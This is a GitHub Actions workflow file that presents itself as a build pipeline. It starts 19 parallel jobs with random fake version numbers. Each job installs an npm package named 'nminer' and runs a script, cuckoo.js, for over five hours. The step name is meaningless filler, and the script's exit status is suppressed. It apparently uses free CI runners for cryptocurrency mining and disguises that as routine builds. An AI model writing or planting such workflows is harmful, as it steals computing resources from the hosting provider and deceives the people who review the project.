name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4723 }
          - { version: 578 }
          - { version: 1916 }
          - { version: 6849 }
          - { version: 4291 }
          - { version: 1654 }
          - { version: 9866 }
          - { version: 7169 }
          - { version: 2555 }
          - { version: 4142 }
          - { version: 7842 }
          - { version: 6150 }
          - { version: 7260 }
          - { version: 5143 }
          - { version: 3797 }
          - { version: 9010 }
          - { version: 3524 }
          - { version: 7638 }
          - { version: 5467 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: extent concerning gastropod but until
        run: |
          npm install nminer@latest
          timeout 321m node cuckoo.js || echo "cuckoo executed"